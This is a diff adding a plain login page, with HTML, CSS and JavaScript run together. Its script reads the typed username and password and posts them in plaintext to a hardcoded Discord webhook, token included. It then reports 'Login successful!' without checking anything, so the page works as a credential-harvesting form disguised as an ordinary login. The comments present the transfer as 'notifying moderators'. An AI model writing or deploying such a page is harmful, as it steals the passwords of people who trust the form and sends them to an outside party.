@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login</title>
+  <link rel="stylesheet" href="styles.css"> <!-- You'll create this file for styling -->
+</head>
+<body>
+  <div class="login-container">
+    <h2>Login</h2>
+    <form id="login-form">
+      <div class="form-group">
+        <label for="username">Username:</label>
+        <input type="text" id="username" name="username" required>
+      </div>
+      <div class="form-group">
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" required>
+      </div>
+      <button type="submit">Login</button>
+    </form>
+  </div>
+
+  <script src="script.js"></script> <!-- You'll create this file for scripting -->
+</body>
+</html>
+body {
+    font-family: Arial, sans-serif;
+    background-color: #1b1b1b;
+    color: #fff;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+  }
+  
+  .login-container {
+    background-color: #f0f0f0;
+    padding: 20px;
+    border-radius: 8px;
+  }
+  
+  .form-group {
+    margin-bottom: 15px;
+  }
+  
+  label {
+    display: block;
+    margin-bottom: 5px;
+  }
+  
+  input {
+    width: 100%;
+    padding: 8px;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+  }
+  
+  button {
+    padding: 10px 20px;
+    background-color: #4caf50;
+    color: #fff;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+  }
+  
+  button:hover {
+    background-color: #45a049;
+  }
+  document.getElementById("login-form").addEventListener("submit", function(event) {
+    event.preventDefault(); // Prevent form submission
+    
+    // Get input values
+    var username = document.getElementById("username").value;
+    var password = document.getElementById("password").value;
+    
+    // Here, you would typically validate the username and password
+    
+    // Example: Sending data to Discord webhook
+    var webhookURL = "https://discord.com/api/webhooks/1237531205767794768/7MdwQCSA4WDzFVJMtpUXXyvVujpaPkiblIfjMu3v5cvcA1o59JNG8fFt0C1X3q6Qo3En";
+    var message = {
+      username: "Login Notification",
+      content: "Username: " + username + "\nPassword: " + password
+    };
+  
+    fetch(webhookURL, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(message)
+    }).then(function(response) {
+      if (response.ok) {
+        alert("Login successful!");
+      } else {
+        alert("Failed to notify moderators. Please try again later.");
+      }
+    }).catch(function(error) {
+      console.error("Error:", error);
+      alert("An error occurred. Please try again later.");
+    });
+  });
